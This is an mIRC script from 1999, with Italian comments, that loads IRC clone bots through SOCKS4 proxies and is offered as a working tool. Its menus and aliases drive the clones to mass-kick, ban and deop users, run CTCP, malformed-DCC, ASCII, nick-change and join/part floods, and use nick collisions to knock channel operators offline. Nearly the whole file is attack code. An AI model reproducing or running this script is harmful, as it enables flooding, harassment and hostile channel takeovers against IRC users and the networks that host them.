; v11(public release) by tribe, kefz.
; Questo Codice deriva essenzialmente dal tribe per la parte della connessione SOCKS FIREWALL...tutte le modifiche
; sono invece state introdotte da LazZaro per il LazZaro Script su idea e collaborazione di Da|tanius (daltanius@tande.com)! Copyright 1999  
; Enjoy! [eheh e non mi venite a dire che il LazZaro è uno script Lamah :O) ]

on *:DNS:{
  if (%fw.cloning == 1) {
    .set %fw.cloning 0
    .set %fw.server $iaddress
    if (%fw.proxy != local) {
      go1
    }
    if (%fw.proxy == local) {
      go2
    }
  }
}
alias go {
  if ($1 == $null || $2 == $null || $3 == $null) { echo 0 -a [usage, /go [firewall] [quanti] [server] [porta] ] | halt }
  if ($4 != $null) { .set %fw.port $4 } | else { .set %fw.port 6667 }
  skwinchk | .set %fw.granted 0 | .set %fw.connected 0 | .set %fw.current2 0 | .set %fw.proxy $1 | .set %fw.amount $2 | .set %fw.cloning 1 | .set %port.byte1 %fw.port / 256 | .set %port.byte2 %fw.port % 256 | .dns $3
  aline 1  @fwclones Connessione di $$2 cloni, su $$3, usando $$1 $+ 
}

alias go1 { .sockopen firewall %fw.proxy 1080 }
alias goex { if (%fw.amount == %fw.current2) { clear @fwclones | .timer 1 5 aline 1  @fwclones [caricamento terminato, attendere qualche secondo per la connessione degli ultimi] | halt } | .sockopen firewall %fw.proxy 1080 }
alias go2 {
  .inc %fw.current2
  %fw.sock = fw $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ [ [ %fw.current2 ] ]
  .sockopen %fw.sock %fw.server %fw.port
  .sockmark %fw.sock x $+ %fw.sock $+ x 
}

on *:sockopen:fw*:{
  if ($sockerr > 0) { .aline 1 @fwclones [errore apertura socket, chiusura server $sockname $+ ] | return }
  .sockwrite -n %fw.sock NICK $sock(%fw.sock).mark
  if (%fw.identd == 0) { .sockwrite -n %fw.sock USER  $+ $rand(0,15) $+ $chr(44) $+ $rand(0,15) $+  $+ $rand(a,z) $+ $rand(A,Z) "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :Fj: }
  elseif (%fw.ident == 1) { .sockwrite -n %fw.sock USER %fw.identd.x "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :Fj: }
  else { .sockwrite -n %fw.sock USER $replace($rname,$chr(124),i) "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :Fj: }
  if (%fw.granted != 1) { .alkne 1  @fwclones [ $+ %fw.sock $+ : $+ $sock(%fw.sock).mark $+ ] connessione al server in corso [ident/nick( $+ $sock(%fw.sock).mark $+ )] | .timer90 0 30 /antiidle | .set %fw.granted 1 }
  .timer92 1 7 /goex
}
on *:sockopen:firewall:{
  if ($sockerr > 0) { .aline 1  @fwclones [errore apertura socket, chiusura sock $sockname $+ ] | return }
  bset &binvar 1 4 | bset &binvar 2 1 | bset &binvar 3 $int(%port.byte1) | bset &binvar 4 %port.byte2 | bset &binvar 5 $gettok(%fw.server,1,46) | bset &binvar 6 $gettok(%fw.server,2,46) | bset &binvar 7 $gettok(%fw.server,3,46) | bset &binvar 8 $gettok(%fw.server,4,46) | bset &binvar 9 0  
  .sockwrite firewall &binvar | if (%fw.connected != 1) { .aline 1  @fwclones [ $+ $sockname $+ ] connesso al firewall, inviati dati binari.. | .set %fw.connected 1 }
}

on *:sockread:firewall:{
  if ($sockerr > 0) { .aline 1  @fwclones [errore lettura socket, chiusura sock $sockname $+ ] | return }
  .aline 1  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] firewall aperta..
  :nextread1 | sockread 4096 &binvar | if ($sockbr == 0) { return }
  if ($bvar(&binvar,2) == 90) {
    .inc %fw.current2
    %fw.sock = fw $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ [ [ %fw.current2 ] ]
    .sockrename $sockname %fw.sock | .sockmark %fw.sock x $+ %fw.sock $+ x | .sockwrite -n %fw.sock NICK $sock(%fw.sock).mark
    if (%fw.identd == 0) { .sockwrite -n %fw.sock USER  $+ $rand(0,15) $+ $chr(44) $+ $rand(0,15) $+  $+ $rand(a,z) $+ $rand(A,Z) "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :Fj: }
    elseif (%fw.ident == 1) { .sockwrite -n %fw.sock USER %fw.identd.x "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :uk: }
    else { .sockwrite -n %fw.sock USER $replace($rname,$chr(124),i) "pizza" "pizza.com" ::Frankj Da|ta: $+ : %fw.sock : $+ :uk: }
    if (%fw.granted != 1) { .aline 1  @fwclones [ $+ %fw.sock $+ : $+ $sock(%fw.sock).mark $+ ] accesso firewall effettuato, connessione al server [ident/nick( $+ $sock(%fw.sock).mark $+ )] | .timer90 0 30 /antiidle | .set %fw.granted 1 }
    .timer92 1 7 /goex
  } | if ($bvar(&binvar,2) == 91) { .aline 1  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] accesso firewall rifiutato, codice 91. }
}

#socketignore off
on 1:sockread:fw*:{ halt }
#socketignore end

on *:sockread:fw*:{
  .skwinchk | if ($sockerr > 0) { .aline 1  @fwclones [errore lettura socket, chiusura sock $sockname $+ ] | return }
  :nextread1 | sockread 4096 %temp | if ($sockbr == 0) { return } | if (%temp == $null) { %temp = - }
  if ($gettok(%temp,1,32) == PING) { .sockwrite -n $sockname PONG : $+ %fw.proxy | halt }
  if ($gettok(%temp,4,32) == :If) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] invio /PONG $gettok(%temp,15,32) per connettere. | .sockwrite -n $sockname PONG $gettok(%temp,15,32) }
  if ($gettok(%temp,2,32) == 001) { .aline 1 @fwclones [firewall: $+ $sockname $+ :nick clone: $+ $sock($sockname).mark $+ ] clone connesso. | .sockwrite -n $sockname mode $sock($sockname).mark +i }
  if ($gettok(%temp,1,32) == ERROR) { if (closing isin $gettok(%temp,2,32)) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ : $gettok(%temp,2-,32) $+ ] | halt } }
  if (KICK isin $gettok(%temp,2,32)) { sockwrite -tn $sockname JOIN $gettok(%temp,3,32)}}
}

on *:sockclose:firewall:{ .skwinchk | .aline 1 @fwclones [ $+ $sockname $+ ] firewall chiusa dall'host o rifiutata dal server. }
on *:sockclose:fw*:{ .skwinchk | aline 1 @fwclones Cloni correntemente attivi: $sock(fw*,0) $+ . }

menu @fwclones {
  Connetti ( $+ $lines($mircdir\socks\socks.txt) lines):{
    window -l @socks-searcher 100 100 400 300 /fwclick $mircdir\socks\settings2.txt arial 12
    loadbuf @socks-searcher $mircdir\socks\socks.txt
    titlebar @socks-searcher fare clic con il pulsante destro del mouse per un menu
  }
  avvia cloni:{ go $$?="Firewall? (1080)" $$?="Numero cloni?" $$?="Server? (dev'essere IP)" }
  ident
  .casuali (normale):{ set %fw.identd 3 | echo gli ident dei cloni saranno nomi casuali. }
  .colorati:{ set %fw.identd 0 | echo gli ident dei cloni saranno colorati (non funziona con tutti i server) }
  .preimpostati:{ set %fw.identd 1 | .set %fw.identd.x $$?="Ident?" | echo gli idents dei cloni saranno %fw.identd.x $+ . }
  -
  pre-imposta nicks:{ fw.setnick $$?="preimposta nick cloni con?" }
  leggi nicks da elenco:{ fw.nicklist }
  -
  vai al canale:{ skwinchk | .sockwrite -n fw* JOIN $$?="Canale?" | .aline 1 @fwclones [i cloni stanno andando su $! $+ ] }
  parti dal canale:{ skwinchk | .sockwrite -n fw* PART $$?="Canale?" : $+ %df | .aline 1  @fwclones [i cloni stanno partendo da $! $+ ] }
  comandi
  .op:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +ooo $$?="Nick(s)?" | .aline 1  @fwclones [i cnoni stanno oppando $! $+ ] }
  .deop:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" -ooo $$?="Nick(s)?" | .aline 1  @fwclones [i cloni stanno deoppando $! $+ ] }
  .kick:{ skwinchk | .sockwrite -n fw* KICK #$$?="Canale?" $$?="Nick(s)?" :DarKBoGuS | .aline 1  @fwclones [i cloni hanno kickato $! $+ ] }
  .ban:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +bbb $$?="Mask(s)?" | .aline 1  @fwclones [i cloni hanno bannato $! $+ ] }
  .-
  .parla:{ skwinchk | .sockwrite -n fw* PRIVMSG $$?="Nick/canale?" : $+ $?="Cosa vuoi dirgli?" | .aline -p @fwclones [i cloni hanno parlato] }
  .-
  .comando?:{ skwinchk | .sockwrite -n fw* $$?="Comando RAW da inviare?" | .aline -p @fwclones [i cloni hanno effettuato il comando $! $+ ] }
  -
  floods
  .join/part:{ skwinchk | /sockwrite -n fw* JOIN $$?="Canale?" | sockwrite -n fw* PART $! : $+ %df | .aline  @fwclones [i cloni sono entrati ed usciti da $! $+ ] }
  .join/part(massa):{ jp $$?="Canale?" }
  .join/part(quante volte?):{ set %temp.jpchan $$?="Canale?"
    set %temp.jpht $$?="Quante volte?"
    :nextjp
    inc %temp.jpt
    jp %temp.jpchan
    if (%temp.jpt <= %temp.jpht) { goto nextjp }
  }
  .-
  .flood ctcp:{ fwctcp $$?="Nick/Canale?" }
  .flood cambi nick:{
    fw.nickflood
    .timer 1 6 /fw.nickflood
    .timer 1 12 /fw.nickflood
    .timer 1 18 /fw.nickflood
  }
  .flood ascii: /fwascii $$?="Nick/canale?" 
  .flood avalanche : /fwaval $$?="Nick/canale?"
  .-
  .flood massa:{ sockwrite -n fw* JOIN $$?="What Channel?" | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood | .timer 1 25 /fwctcp $! }

  .reimposta nick cloni:{ clonereset }

  -
  collidi
  .chi?:/setc $$?="Elenco di nicks separati da spazi"
  .canale?:/clps #$$?="Canale? (devi essere lì)"
  termina
  .tutti i cloni:{ cleanup }
  .connessione a firewall:{ skwinchk | /sockclose firewall | .aline  @fwclones [connessione a firewall annullata] | .timer90 off | .timer92 off }
  .-
  .tutto:{ sockclose fw* | .aline  @fwclones [chiusi tutti i sockets] | .timer90 off | .timer92 off }
  .-
  guida(!):{ /aiuto firewallclones }
  -
  chiudi finestra:{ window -c @fwclones }

}
;menu channel,status {
;  firewall clones
;  .load clones:{ go $$?="Firewall? (1080)" $$?="Amount of clones?" $$?="What Server? (must be IP)" }
;  .ident
;  ..random(normal):{ set %fw.identd 3 | echo clones idents will be random names. }
;  ..coloured:{ set %fw.identd 0 | echo clones idents will be coloured (does not work with all servers) }
;  ..pre-set:{ set %fw.identd 1 | .set %fw.identd.x $$?="What Ident?" | echo clones idents will be %fw.identd.x $+ . }
;  .-
;  .pre-set nicks:{ fw.setnick $$?="pres-set clones nicks with what?" }
;  .read nicks from list:{ fw.nicklist }
;  .-
;  .join a chan:{ skwinchk | .sockwrite -n fw* JOIN $$?="What Channel?" | .aline  @fwclones [clones joining $! $+ ] }
;  .part a chan:{ skwinchk | .sockwrite -n fw* PART $$?="What Channel?" : $+ %logo | .aline  @fwclones [clones parting $! $+ ] }
;  commands
;  .op:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +ooo $$?="Nick(s)?" | .aline  @fwclones [clones opping $! $+ ] }
;  .deop:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" -ooo $$?="Nick(s)?" | .aline  @fwclones [clones deoping $! $+ ] }
;  .kick:{ skwinchk | .sockwrite -n fw* KICK #$$?="Canale?" $$?="Nick(s)?" :DarKBoGuS | .aline  @fwclones [clones kicked $! $+ ] }
;  .ban:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +bbb $$?="Mask(s)?" | .aline  @fwclones [clones banned $! $+ ] }
;  .-
;  .floods
;  ..join/part:{ skwinchk | /sockwrite -n fw* JOIN $$?="What Channel?" | sockwrite -n fw* PART $! : $+ %logo | .aline  @fwclones [clones join/parting $! $+ ] }
;  ..join/part(mass):{ jp $$?="What Channel?" }
;  ..join/part(how many times?):{ set %temp.jpchan $$?="What channel?"
;    set %temp.jpht $$?="How many times?"
;    :nextjp
;    inc %temp.jpt
;    jp %temp.jpchan
;    if (%temp.jpt <= %temp.jpht) { goto nextjp }
;  }
;  ..-
;  ..ctcp flood:{ fwctcp $$?="What Channel/Nick?" }
;  ..nickflood:{ fw.nickflood | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood }
;  ..-
;  ..mass floods:{ sockwrite -n fw* JOIN $$?="What Channel?" | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood | .timer 1 25 /fwctcp $! }
;  .reset clone nicks:{ clonereset }
;  .-
;  .kill
;  ..kill all clones:{ cleanup }
;  ..kill firewall:{ skwinchk | /sockclose firewall | .aline  @fwclones [firewall killed] | .timer90 off | .timer92 off }
;  ..-
;  ..kill all:{ sockclose fw* | .aline  @fwclones [closed all sockets] | .timer90 off | .timer92 off }
;  ..-
;  .help(!):{ /aiuto firewallclones }
;}

on *:INPUT:@fwclones: {
  if ($sock(fw*,0) == 0) { echo @fwclones nessun clone attivo. | halt }
  if ($1) {
    goto $1 | halt
    :ctcpflood | fwctcp $$1 | halt
    :nickflood | fw.nickflood | halt
    :join | .sockwrite -n fw* JOIN $$1 $2- | halt
    :part | .sockwrite -n fw* PART $$1 : $+ %logo | halt
    :quit | cleanup $1 | .timer 1 4 .window -c @fwclones | halt
    :dieclones | sockclose fw* | echo @fwclones tutte le connessioni cloni/firewall sono state chiuse. | .timer90 off | .timer92 off | halt
    :raw | sockwrite -n fw* $1-
    :cd | setc $1-
    :help
    echo @fwclones Guida, sono disponibili i seguenti comandi.
    echo @fwclones --------------------------------------------    
    echo @fwclones /join #canale
    echo @fwclones /part #canale
    echo @fwclones /quit <messaggio>
    echo @fwclones /nickflood
    echo @fwclones /ctcpflood nick/#canale
    echo @fwclones /dieclones
    echo @fwclones /raw <comando per il server>
    echo @fwclones /cd nick nick nick nick nick nick etc etc.
    echo @fwclones /help
    halt
    :default
  }
}

alias skwinchk { if ($window(@fwclones) == $null) { .window -e @fwclones 200 200 600 200 @fwclones Arial 11 | titlebar @fwclones finestra stato cloni wingate/firewall, visualizzare /help | echo @fwclones [per la guida digitare /help nella finestra @fwclones] } }
alias antiidle { set %sockx $sock(fw*,0) | if (%sockx > 0) { .sockwrite -n fw* PONG 127.0.0.1 } | aline 1 @fwclones Cloni correntemente attivi: $sock(fw*,0) $+ . }
alias cleanup { if ($1 == $null) { .set %fwclone.quit gameover } | else { .set %fwclone.quit $1 } | .skwinchk | .enable #socketignore | .timer 1 10 .disable #socketignore | set %sockz $sock(*,0) | if (%sockz > 0) { sockwrite -n fw* QUIT :Pizza..( $+ %fwclone.quit $+ ) | .timer 1 10 /sockclose fw* | .aline 1  @fwclones [terminati tutti i cloni] : [connessione firewall annullata] : [chiusi tutti i sockets] | .timer90 off | .timer92 off | halt } | .aline  @fwclones [nessun clone correntemente attivo] | .sockclose f* }
alias rname { if ($exists($mircdirsocks\bogus.txt)) { %identd = $read -n $mircdirsocks\bogus.txt | return %identd | halt } | %identd = $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | return %identd | halt }
alias fwall { .sockwrite -n fw* $1- }
alias fwctcp {
  .skwinchk
  .enable #socketignore
  .timer 1 15 .disable #socketignore
  .sockwrite -n fw* PRIVMSG $1 :VERSION
  .sockwrite -n fw* PRIVMSG $1 :PING
  .sockwrite -n fw* PRIVMSG $1 :CLIENTINFO
  .sockwrite -n fw* PRIVMSG $1 :USERINFO
  .sockwrite -n fw* PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
  .sockwrite -n fw* PRIVMSG $1 :DCC SEND Pizza.Fucks 3353362454 25 666
}
alias fwascii {
  skwinchk
  .sockwrite -n fw* PRIVMSG $1 : $+ ºähålöIºä
  .sockwrite -n fw* PRIVMSG $1 : $+ ºäiålöIºä
  .sockwrite -n fw* PRIVMSG $1 : $+ ºälålöIºä
  .sockwrite -n fw* PRIVMSG $1 : $+ ºäkålöIºä
  .sockwrite -n fw* PRIVMSG $1 : $+ ºäjålöIºä
  .aline -p @fwclones [flood ASCII...]
}  
alias fwaval  {
  skwinchk
  .enable #socketignore
  .timer 1 15 .disable #socketignore
  .sockwrite -n fw* PRIVMSG $1 :PRIVMSG PIZZA :CLIENTINFO RuLeZ VERSION UlamaH FINGER
  .sockwrite -n fw* PRIVMSG $1 :PRIVMSG PIZZA :CLIENTINFO RuLeZ VERSION UlamaH FINGER
  .sockwrite -n fw* PRIVMSG $1 :PRIVMSG PIZZA :CLIENTINFO RuLeZ VERSION UlamaH FINGER
  .aline -p @fwclones [i cloni flood Avalanche]   
} 
alias jp { .skwinchk | .aline  @fwclones [join/part/join $1 $+ ] | .enable #socketignore | .timer 1 15 .disable #socketignore | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 }
alias sockstat { .skwinchk | .aline  @fwclones [stato socket cloni] | set %socks $sock(*,0) | :loop | if (%socks > 0) { .aline  @fwclones [ $+ $sock(fw*,%socks).name : inviati( $+ $sock(*,%socks).sent $+ b):ricevuti( $+ $sock(fw*,%socks).rcvd $+ b) : coda invio( $+ $sock(*,%socks).sq $+ b):coda ricezione( $+ $sock(fw*,%socks).rq $+ b) : ultimo invio( $+ $sock(fw*,%socks).ls $+ ):ultima ricezione( $+ $sock(fw*,%socks).lr $+ ) : mark( $+ $sock(fw*,%socks).mark $+ )] | dec %socks | goto loop } }
alias clonereset { .skwinchk | .aline  @fwclones [nick cloni reimpostati] | set %socks $sock(*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(*,%socks).name NICK x[ $+ %socks $+ ]x | dec %socks | goto loop } }
alias fw.setnick { .skwinchk | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $$1 $+ %socks | dec %socks | goto loop } }
alias fw.nicklist { .skwinchk
  set %socks $sock(fw*,0)
  :loop
  if (%socks > 0) {
    %arf = % +$ fw.colnick $+ [ [ %socks ] ]
    .sockwrite -n $sock(fw*,%socks).name NICK $read $mircdirsocks\bogus.txt
    dec %socks
    goto loop
  }
}
alias fw.nickflood { .skwinchk | .enable #socketignore | .timer 1 15 .disable #socketignore | .aline  @fwclones [nick flooding] | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | dec %socks | goto loop } }

;[ alias collisione non terminati ]
alias clps { 
  .skwinchk | .aline  @fwclones [collisione ops di $$1 in corso]
  set %socks $sock(fw*,0) | set %fw.cl.ops 0 | if (%socks < $opnick($$1,0)) { .aline  @fwclones [cloni insufficienti per collidere tutti gli ops di $$1 $+ ] }
  :loop | if (%socks > 0) { .inc %fw.cl.ops | .sockwrite -n $sock(fw*,%socks).name NICK $opnick($$1,%fw.cl.ops) | dec %socks | goto loop }
}

alias setc {
  if ($sock(fw*,1).status != $null) { .sockwrite -n $sock(fw*,1).name nick $1 }
  if ($sock(fw*,2).status != $null) { .sockwrite -n $sock(fw*,2).name nick $2 }
  if ($sock(fw*,3).status != $null) { .sockwrite -n $sock(fw*,3).name nick $3 }
  if ($sock(fw*,4).status != $null) { .sockwrite -n $sock(fw*,4).name nick $4 }
  if ($sock(fw*,5).status != $null) { .sockwrite -n $sock(fw*,5).name nick $5 }
  if ($sock(fw*,6).status != $null) { .sockwrite -n $sock(fw*,6).name nick $6 }
  if ($sock(fw*,7).status != $null) { .sockwrite -n $sock(fw*,7).name nick $7 }
  if ($sock(fw*,8).status != $null) { .sockwrite -n $sock(fw*,8).name nick $8 }
  if ($sock(fw*,9).status != $null) { .sockwrite -n $sock(fw*,9).name nick $9 }
  if ($sock(fw*,10).status != $null) { .sockwrite -n $sock(fw*,10).name nick $10 }
  if ($sock(fw*,11).status != $null) { .sockwrite -n $sock(fw*,11).name nick $11 }
  if ($sock(fw*,12).status != $null) { .sockwrite -n $sock(fw*,12).name nick $12 }
  if ($sock(fw*,13).status != $null) { .sockwrite -n $sock(fw*,13).name nick $13 }
  if ($sock(fw*,14).status != $null) { .sockwrite -n $sock(fw*,14).name nick $14 }
  if ($sock(fw*,15).status != $null) { .sockwrite -n $sock(fw*,15).name nick $15 }
  if ($sock(fw*,16).status != $null) { .sockwrite -n $sock(fw*,16).name nick $16 }
  if ($sock(fw*,17).status != $null) { .sockwrite -n $sock(fw*,17).name nick $17 }
  if ($sock(fw*,18).status != $null) { .sockwrite -n $sock(fw*,18).name nick $18 }
  if ($sock(fw*,19).status != $null) { .sockwrite -n $sock(fw*,19).name nick $19 }
  if ($sock(fw*,20).status != $null) { .sockwrite -n $sock(fw*,20).name nick $20 }
  if ($sock(fw*,21).status != $null) { .sockwrite -n $sock(fw*,21).name nick $21 }
  if ($sock(fw*,22).status != $null) { .sockwrite -n $sock(fw*,22).name nick $22 }
  if ($sock(fw*,23).status != $null) { .sockwrite -n $sock(fw*,23).name nick $23 }
  if ($sock(fw*,24).status != $null) { .sockwrite -n $sock(fw*,24).name nick $24 }
  if ($sock(fw*,25).status != $null) { .sockwrite -n $sock(fw*,25).name nick $25 }
  if ($sock(fw*,26).status != $null) { .sockwrite -n $sock(fw*,26).name nick $26 }
  if ($sock(fw*,27).status != $null) { .sockwrite -n $sock(fw*,27).name nick $27 }
  if ($sock(fw*,28).status != $null) { .sockwrite -n $sock(fw*,28).name nick $28 }
  if ($sock(fw*,29).status != $null) { .sockwrite -n $sock(fw*,29).name nick $29 }
  if ($sock(fw*,30).status != $null) { .sockwrite -n $sock(fw*,30).name nick $30 }
  if ($sock(fw*,31).status != $null) { .sockwrite -n $sock(fw*,31).name nick $31 }
  if ($sock(fw*,32).status != $null) { .sockwrite -n $sock(fw*,32).name nick $32 }
  if ($sock(fw*,33).status != $null) { .sockwrite -n $sock(fw*,33).name nick $33 }
  if ($sock(fw*,34).status != $null) { .sockwrite -n $sock(fw*,34).name nick $34 }
  if ($sock(fw*,35).status != $null) { .sockwrite -n $sock(fw*,35).name nick $35 }
  if ($sock(fw*,36).status != $null) { .sockwrite -n $sock(fw*,36).name nick $36 }
  if ($sock(fw*,37).status != $null) { .sockwrite -n $sock(fw*,37).name nick $37 }
  if ($sock(fw*,38).status != $null) { .sockwrite -n $sock(fw*,38).name nick $38 }
  if ($sock(fw*,39).status != $null) { .sockwrite -n $sock(fw*,39).name nick $39 }
  if ($sock(fw*,40).status != $null) { .sockwrite -n $sock(fw*,40).name nick $40 }
  if ($sock(fw*,41).status != $null) { .sockwrite -n $sock(fw*,41).name nick $41 }
  if ($sock(fw*,42).status != $null) { .sockwrite -n $sock(fw*,42).name nick $42 }
  if ($sock(fw*,43).status != $null) { .sockwrite -n $sock(fw*,43).name nick $43 }
  if ($sock(fw*,44).status != $null) { .sockwrite -n $sock(fw*,44).name nick $44 }
  if ($sock(fw*,45).status != $null) { .sockwrite -n $sock(fw*,45).name nick $45 }
  if ($sock(fw*,46).status != $null) { .sockwrite -n $sock(fw*,46).name nick $46 }
  if ($sock(fw*,47).status != $null) { .sockwrite -n $sock(fw*,47).name nick $47 }
  if ($sock(fw*,48).status != $null) { .sockwrite -n $sock(fw*,48).name nick $48 }
  if ($sock(fw*,49).status != $null) { .sockwrite -n $sock(fw*,49).name nick $49 }
  if ($sock(fw*,50).status != $null) { .sockwrite -n $sock(fw*,50).name nick $50 }
  if ($sock(fw*,51).status != $null) { .sockwrite -n $sock(fw*,51).name nick $51 }
  if ($sock(fw*,52).status != $null) { .sockwrite -n $sock(fw*,52).name nick $52 }
  if ($sock(fw*,53).status != $null) { .sockwrite -n $sock(fw*,53).name nick $53 }
  if ($sock(fw*,54).status != $null) { .sockwrite -n $sock(fw*,54).name nick $54 }
  if ($sock(fw*,55).status != $null) { .sockwrite -n $sock(fw*,55).name nick $55 }
  if ($sock(fw*,56).status != $null) { .sockwrite -n $sock(fw*,56).name nick $56 }
  if ($sock(fw*,57).status != $null) { .sockwrite -n $sock(fw*,57).name nick $57 }
  if ($sock(fw*,58).status != $null) { .sockwrite -n $sock(fw*,58).name nick $58 }
  if ($sock(fw*,59).status != $null) { .sockwrite -n $sock(fw*,59).name nick $59 }
  if ($sock(fw*,60).status != $null) { .sockwrite -n $sock(fw*,60).name nick $60 }
  if ($sock(fw*,61).status != $null) { .sockwrite -n $sock(fw*,61).name nick $61 }
  if ($sock(fw*,62).status != $null) { .sockwrite -n $sock(fw*,62).name nick $62 }
  if ($sock(fw*,63).status != $null) { .sockwrite -n $sock(fw*,63).name nick $63 }
  if ($sock(fw*,64).status != $null) { .sockwrite -n $sock(fw*,64).name nick $64 }
  if ($sock(fw*,65).status != $null) { .sockwrite -n $sock(fw*,65).name nick $65 }
  if ($sock(fw*,66).status != $null) { .sockwrite -n $sock(fw*,66).name nick $66 }
  if ($sock(fw*,67).status != $null) { .sockwrite -n $sock(fw*,67).name nick $67 }
  if ($sock(fw*,68).status != $null) { .sockwrite -n $sock(fw*,68).name nick $68 }
  if ($sock(fw*,69).status != $null) { .sockwrite -n $sock(fw*,69).name nick $69 }
  if ($sock(fw*,70).status != $null) { .sockwrite -n $sock(fw*,70).name nick $70 }
}
alias fwdel {
  .set %fwdel.search $read -w* $+ $$1 $+ * $mircdirsocks\socks.txt | .set %fwdel.deline $readn | write -dl $+ $readn $mircdirsocks\socks.txt
  if ($window(@socks-searcher)) { clear -l @socks-searcher | loadbuf @socks-searcher $mircdirsocks\socks.txt }
}
